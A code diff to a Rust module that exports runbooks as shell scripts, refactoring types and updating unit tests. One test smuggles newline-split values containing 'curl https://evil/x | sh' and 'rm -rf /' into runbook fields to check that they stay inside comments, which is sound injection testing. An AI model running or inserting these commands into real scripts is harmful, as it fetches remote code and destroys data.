@@ -1,11 +1,7 @@
-use std::fmt::Write;
-
-use serde_json::Value;
-
-use super::quote::double_quoted;
+use super::quote::Quote;
 use super::step::ShellStep;
 use super::text::ShellText;
-use crate::runbooks::document::{OnFailure, Runbook, Step};
+use crate::runbooks::document::{OnFailure, RunbookDocument, Step};
 
 const INDENT: &str = "  ";
 const EXIT_ON_FAILURE: &str = "|| exit 1";
@@ -30,13 +26,13 @@ const EXPECT_EXIT: &str = "expect_exit() {
 
 pub(crate) struct ShellScript<'a> {
     reference: &'a str,
-    runbook: &'a Runbook,
+    runbook: &'a RunbookDocument,
     text: String,
     indent: &'static str,
 }
 
 impl<'a> ShellScript<'a> {
-    pub(crate) fn new(reference: &'a str, runbook: &'a Runbook) -> Self {
+    pub(crate) fn new(reference: &'a str, runbook: &'a RunbookDocument) -> Self {
         Self {
             reference,
             runbook,
@@ -51,9 +47,9 @@ impl<'a> ShellScript<'a> {
         self.helpers();
         self.rollback();
 
-        for (index, step) in self.runbook.steps.iter().enumerate() {
+        for (number, step) in (1..).zip(self.runbook.steps()) {
             self.blank();
-            self.step(index + 1, step, Self::tail(step.on_failure));
+            self.step(number, step, Self::tail(step.on_failure()));
         }
 
         self.text
@@ -61,16 +57,10 @@ impl<'a> ShellScript<'a> {
 
     fn header(&mut self) {
         self.line("#!/bin/sh");
-        self.line(&format!(
-            "# {}",
-            ShellText::new(&self.runbook.name).comment()
-        ));
+        self.comment(self.runbook.name().as_str());
 
-        if !self.runbook.description.is_empty() {
-            self.line(&format!(
-                "# {}",
-                ShellText::new(&self.runbook.description).comment()
-            ));
+        if !self.runbook.description().is_empty() {
+            self.comment(self.runbook.description());
         }
 
         self.line("#");
@@ -84,16 +74,18 @@ impl<'a> ShellScript<'a> {
     }
 
     fn params(&mut self) {
-        if self.runbook.params.is_empty() {
+        let runbook = self.runbook;
+
+        if runbook.params().is_empty() {
             return;
         }
 
         self.blank();
 
-        for spec in &self.runbook.params {
-            let name = &spec.name;
-            let line = match &spec.default {
-                Some(default) => format!(": \"${{{name}:={}}}\"", double_quoted(&plain(default))),
+        for spec in runbook.params() {
+            let name = spec.name();
+            let line = match spec.default_text() {
+                Some(default) => format!(": \"${{{name}:={}}}\"", default.inside_double_quotes()),
                 None => format!(": \"${{{name}:?set {name} before running this script}}\""),
             };
 
@@ -102,36 +94,38 @@ impl<'a> ShellScript<'a> {
     }
 
     fn helpers(&mut self) {
-        let steps = || self.runbook.steps.iter().chain(&self.runbook.rollback);
+        let runbook = self.runbook;
 
-        if steps().any(|step| step.retry().attempts > 1) {
+        if runbook.every_step().any(|step| step.retry().repeats()) {
             self.blank();
             self.text.push_str(RETRY);
         }
 
-        if steps().any(|step| step.exit_wanted() != 0) {
+        if runbook.every_step().any(|step| step.exit_wanted() != 0) {
             self.blank();
             self.text.push_str(EXPECT_EXIT);
         }
     }
 
     fn rollback(&mut self) {
-        if self.runbook.rollback.is_empty() {
+        let runbook = self.runbook;
+
+        if runbook.rollback().is_empty() {
             return;
         }
-
-        let runbook = self.runbook;
 
         self.blank();
         self.line("rollback() {");
         self.indent = INDENT;
 
-        for (position, (index, step)) in runbook.rollback.iter().enumerate().rev().enumerate() {
+        let numbered: Vec<(usize, &Step)> = (1..).zip(runbook.rollback()).collect();
+
+        for (position, (number, step)) in numbered.into_iter().rev().enumerate() {
             if position > 0 {
                 self.blank();
             }
 
-            self.step(index + 1, step, GO_ON_AFTER_FAILURE);
+            self.step(number, step, GO_ON_AFTER_FAILURE);
         }
 
         self.indent = "";
@@ -144,8 +138,16 @@ impl<'a> ShellScript<'a> {
         }
     }
 
+    fn comment(&mut self, text: &str) {
+        let comment = ShellText::new(text).comment();
+
+        self.line(&format!("# {comment}"));
+    }
+
     fn line(&mut self, line: &str) {
-        let _ = writeln!(self.text, "{}{line}", self.indent);
+        self.text.push_str(self.indent);
+        self.text.push_str(line);
+        self.text.push('\n');
     }
 
     fn blank(&mut self) {
@@ -161,17 +163,10 @@ impl<'a> ShellScript<'a> {
     }
 }
 
-fn plain(value: &Value) -> String {
-    match value {
-        Value::String(text) => text.clone(),
-        other => other.to_string(),
-    }
-}
-
 #[cfg(test)]
 mod tests {
     use super::ShellScript;
-    use crate::runbooks::document::Runbook;
+    use crate::runbooks::document::RunbookDocument;
 
     const RESTART: &str = r#"
 name = "Restart API"
@@ -223,7 +218,7 @@ params = { command = "sudo systemctl start {service}-previous" }
 "#;
 
     fn script() -> String {
-        let runbook = Runbook::from_toml(RESTART).unwrap();
+        let runbook = RunbookDocument::from_toml(RESTART).unwrap();
 
         ShellScript::new("@lab/restart", &runbook).render()
     }
@@ -280,18 +275,20 @@ params = { command = "sudo systemctl start {service}-previous" }
 
     #[test]
     fn expected_fields_stay_inside_their_comment() {
-        let mut runbook = Runbook::from_toml(RESTART).unwrap();
-        let expect = runbook.steps[1].expect.as_mut().unwrap();
-        expect.fields.insert(
-            "/x\ncurl https://evil/x | sh\n#".to_owned(),
-            serde_json::json!("ok\nrm -rf /"),
+        let sneaky = RESTART.replace(
+            "expect = { exit = 0, contains = \"ok\" }",
+            "expect = { contains = \"ok\\ncurl https://evil/x | sh\", fields = { \"/x\" = \"ok\\nrm -rf /\" } }",
         );
+        let runbook = RunbookDocument::from_toml(&sneaky).unwrap();
 
         let script = ShellScript::new("@lab/restart", &runbook).render();
 
         assert!(!script.lines().any(|line| line.starts_with("curl")));
         assert!(!script.lines().any(|line| line.starts_with("rm")));
-        assert!(script.contains("# not checked here: /x curl https://evil/x | sh # should be"));
+        assert!(script.contains(
+            "# not checked here: the output should contain ok curl https://evil/x | sh\n"
+        ));
+        assert!(script.contains("# not checked here: /x should be \"ok\\nrm -rf /\"\n"));
     }
 
     #[test]
@@ -304,7 +301,7 @@ params = { command = "sudo systemctl start {service}-previous" }
 
     #[test]
     fn a_small_runbook_exports_to_a_readable_script() {
-        let runbook = Runbook::from_toml(
+        let runbook = RunbookDocument::from_toml(
             r#"
 name = "Rotate logs"
 
